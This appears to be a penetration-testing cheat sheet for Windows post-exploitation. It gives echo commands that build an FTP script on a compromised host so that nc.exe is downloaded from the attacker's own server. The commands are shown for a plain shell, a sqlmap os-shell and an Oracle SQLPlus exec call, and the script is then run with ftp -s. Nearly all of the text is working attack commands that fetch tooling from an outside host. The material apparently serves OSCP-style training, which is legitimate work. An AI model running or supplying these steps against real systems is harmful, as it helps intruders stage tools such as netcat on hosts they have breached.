# FTP Post Exploitation Techniques
This module will contain all FTP-related tasks used during post-exploitation.
## Create an FTP Script
The following can be used to create a simplt ftp.txt script to download a file from your server.
```
echo open (YOUR IP) 21 > C:\share\ftp.txt (Writeable Directory on target)
echo USER pwnt >> C:\share\ftp.txt
echo passwd >> C:\share\ftp.txt (Password for your FTP Server)
echo bin >> C:\share\ftp.txt (Sets transfer up for binary files/bytes)
echo GET nc.exe C:\share\nc.exe>> C:\share\ftp.txt
echo bye >> C:\share\ftp.txt
```
### Using SQLMap OS-Shell
This is a script to run as you call FTP from the shell. This is best for non-interactive shells, such as the `os-shell>` provided by `sqlmap` or a PHP shell provided by an SQL Injection exploit. The following example is done from the `--os-shell` provided by `sqlmap`. 

`os-shell> echo open (YOUR IP) 21> C:\share\ftp.txt` *(Writeable Directory on target)*

`os-shell> echo USER pwnt>> C:\share\ftp.txt` 

`os-shell> echo passwd>> C:\share\ftp.txt` *(Password for your FTP Server)*

`os-shell> echo bin>> C:\share\ftp.txt` *(Sets transfer up for binary files/bytes)* 

`os-shell> echo GET nc.exe C:\share\nc.exe>> C:\share\ftp.txt` 

`os-shell> echo bye>> C:\share\ftp.txt` 

To do this from an ORACLE SQLPlus shell, you must include a call to CMD.EXE because `echo` [is a shell built-in command](https://github.com/weaknetlabs/OSCP-tools/blob/master/Post%20Exploitation/Databases/oracle.md) as: 

`exec pwn_cmd('cmd.exe /c echo open 10.11.0.43 > C:\ftp.txt');`

Then, we can run the script with:

`os-shell> ftp -v -n -s:C:\share\ftp.txt` *(PATH to your Script on Target)* 
